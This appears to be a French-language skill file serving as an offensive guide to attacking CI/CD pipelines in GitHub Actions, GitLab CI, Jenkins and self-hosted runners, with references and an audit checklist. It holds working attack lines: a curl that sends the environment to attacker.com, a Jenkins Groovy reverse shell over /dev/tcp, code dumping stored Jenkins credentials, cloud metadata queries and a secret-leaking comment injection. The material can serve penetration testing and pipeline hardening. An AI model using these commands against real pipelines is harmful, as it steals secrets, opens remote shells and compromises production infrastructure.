---
name: cicd-pipeline-attacks
description: Guide complet des attaques de pipeline CI/CD — GitHub Actions, GitLab CI, Jenkins, secret extraction, poisoned pipeline execution, Artifact poisoning, outils
---

# CI/CD Pipeline Attacks — Guide d'Exploitation Avancé

## Références principales
- **HackTricks CI/CD** : https://hacktricks.wiki/en/pentesting-web/ci-cd-security/
- **OWASP CI/CD Security** : https://owasp.org/www-project-top-10-ci-cd-security-risks/
- **PortSwigger CI/CD Research** : https://portswigger.net/research/pipeline-attacks
- **Cider Security's CI/CD Goof** : https://github.com/cider-security-research/cicd-goof

---

## 1. Concepts fondamentaux

Les pipelines CI/CD automatisent le build, test et déploiement. Un accès au pipeline = accès à l'infrastructure de production.

### Risques principaux
| Risque | OWASP CI/CD | Description |
|--------|-------------|-------------|
| Poisoned Pipeline Execution | CICD-SEC-01 | Attaquant modifie le code du pipeline |
| Insufficient PBAC | CICD-SEC-02 | Permissions trop larges |
| Dependency Confusion | CICD-SEC-03 | Packages malveillants |
| Pipeline Variable Injection | CICD-SEC-04 | Variables d'environnement |
| Artifact Poisoning | CICD-SEC-05 | Artefacts malveillants |
| Secret Leakage | CICD-SEC-06 | Fuite de secrets dans logs |
| Self-hosted Runner Abuse | CICD-SEC-07 | Runner compromis |

---

## 2. GitHub Actions Attacks

### 2.1 Poisoned Pipeline Execution (PPE)

```yaml
# .github/workflows/ci.yml — VULNÉRABLE
on:
  pull_request_target:  # ⚠️ Exécuté dans le contexte du repo cible
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: make build
```

**Exploitation** : Ouvrir une PR avec `make build` modifié pour exécuter des commandes arbitraires dans le contexte du repo protégé (avec tokens GITHUB_TOKEN, secrets accessibles).

### 2.2 Secret Extraction via PR

```yaml
# Workflow vulnérable
- name: Run tests
  run: |
    echo "Building..."
    # La PR modifie le script de build
    # Ajoute : curl http://attacker.com/$MY_SECRET
```

**Exploitation** : Ouvrir une PR qui ajoute dans le script de build :
```bash
curl -X POST "https://attacker.com/exfil" -d "$(env)"
```

### 2.3 Deprecated Actions

```yaml
# Utiliser des actions non maintenues ou compromises
- uses: actions/create-release@v1  # Obsolète
- uses: docker://malicious/image:latest
```

### 2.4 Artifact Poisoning

```bash
# Télécharger un artifact d'un workflow malveillant
gh run download <run-id> --name artifact
# Si l'artifact n'est pas signé, injection de binaire malveillant
```

---

## 3. GitLab CI Attacks

### 3.1 CI Job Token Abuse

```yaml
# .gitlab-ci.yml — Job token abuse
job:
  script:
    - curl -H "JOB-TOKEN: $CI_JOB_TOKEN" "https://gitlab.com/api/v4/projects/$CI_PROJECT_ID/secrets"
```

Le token CI a accès à l'API GitLab avec les permissions du user qui a déclenché le job.

### 3.2 Malicious Runner

```bash
# Si un runner partagé est compromis
# L'attaquant modifie /builds/ avant l'exécution
# Dépose un backdoor dans l'image Docker
```

### 3.3 Environment Injection

```yaml
deploy:
  script:
    - echo "Deploying $CI_ENVIRONMENT_NAME -> $CI_ENVIRONMENT_URL"
    - # Si $CI_ENVIRONMENT_URL contient "https://attacker.com" → exfiltration
```

---

## 4. Jenkins Attacks

### 4.1 Groovy Script Console

```groovy
// Accès à Jenkins Script Console
def proc = "whoami".execute()
println proc.text

// Reverse shell
def cmd = "bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"
cmd.execute()

// Extraction de credentials
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.Credentials.class,
    Jenkins.instance,
    null,
    null
)
creds.each { println "${it.id}: ${it.secret}" }
```

### 4.2 Pipeline as Code (Jenkinsfile)

```groovy
// Jenkinsfile — VULNÉRABLE
node {
    stage('Build') {
        checkout scm  // Checkout du code PR
    }
    stage('Test') {
        sh """
            make test   // Si make est modifié dans la PR → RCE
        """
    }
    stage('Deploy') {
        withCredentials([string(credentialsId: 'prod-key', variable: 'KEY')]) {
            sh "deploy.sh $KEY"  // KEY exfiltrée
        }
    }
}
```

### 4.3 Jenkins Build Auth Bypass

```bash
# Si le build est déclenché sans auth
curl -X POST "https://jenkins.internal/job/project/build" --user ":"  # Auth bypass
```

---

## 5. Self-Hosted Runner Exploitation

### 5.1 Runner avec Docker

```yaml
# Si le runner est sur la même machine que d'autres services
- run: docker run -v /var/run/docker.sock:/var/run/docker.sock alpine
```

### 5.2 Attaque sur le runner

```yaml
# Vérifier l'environnement du runner
- run: |
    cat /proc/1/cgroup  # Vérifier si le runner est dans un conteneur
    curl -s http://169.254.169.254/latest/meta-data/  # Cloud metadata (AWS)
    curl -s http://metadata.google.internal/computeMetadata/v1/  # GCP
```

---

## 6. Secret Extraction Techniques

### 6.1 PR Comment Injection

```yaml
on: issue_comment

jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "${{ github.event.comment.body }}"
```

**Exploitation** : Poster un commentaire contenant `${{ secrets.ADMIN_TOKEN }}` → le workflow affiche le secret.

### 6.2 Matrix Build Injection

```yaml
strategy:
  matrix:
    os: [ubuntu-latest, windows-latest]
    node: [14, 16, 18]
steps:
  - run: echo "Testing on ${{ matrix.os }} with node ${{ matrix.node }}"
```

Si un paramètre de matrice contient une expression, elle est évaluée.

### 6.3 Fork PR Secret Leak (par défaut non)

```yaml
# Par défaut, les forks n'ont pas accès aux secrets
# Mais pull_request_target SI
```

---

## 7. Outils

```bash
# GitLeaks — Secret scanning
gitleaks detect -v

# TruffleHog — Secret scanning
trufflehog git https://github.com/victim/repo --only-verified

# gitleaks-action
git log -p | gitleaks detect

# gh-scanner
gh api repos/:owner/:repo/actions/secrets

# CI/CD Pentesting
# Cider Security CI/CD Goof
git clone https://github.com/cider-security-research/cicd-goof.git
cd cicd-goof
cat README.md
```

---

## 8. Checklist

```
GITHUB ACTIONS
☐ pull_request_target dans les workflows → PPE possible ?
☐ Secrets accessibles depuis les PRs forkes ?
☐ Actions obsolètes / non maintenues ?
☐ GITHUB_TOKEN avec trop de permissions ?
☐ Workflow exécute du code non audité (PR checkout) ?
☐ Artifact non signé / non vérifié ?

GITLAB CI
☐ CI_JOB_TOKEN permissions excessives ?
☐ Runner partagé accessible aux projects externes ?
☐ Variables CI exposées dans les logs ?
☐ Pipeline triggers non authentifiés ?

JENKINS
☐ Script Console accessible sans auth ?
☐ Credentials stockés en clair ?
☐ Build triggers non authentifiés ?
☐ Plugin obsolète avec CVE ?
☐ Jenkinsfile vérifié avant exécution ?

GÉNÉRAL
☐ Secrets dans les logs de build ?
☐ Cache CI pollué (dépendances) ?
☐ Artifact non signé ?
☐ Variable injection via parameters ?
☐ Runner auto-hébergé compartimenté ?
☐ Accès réseau du runner limité ?
☐ Image Docker du build compromise ?

EXPLOITATION
☐ Vol de secrets via PR
☐ RCE via pipeline
☐ Accès aux environments cloud (metadata service)
☐ Persistance via modification de workflow
☐ Artifact poisoning → livraison de code malveillant
```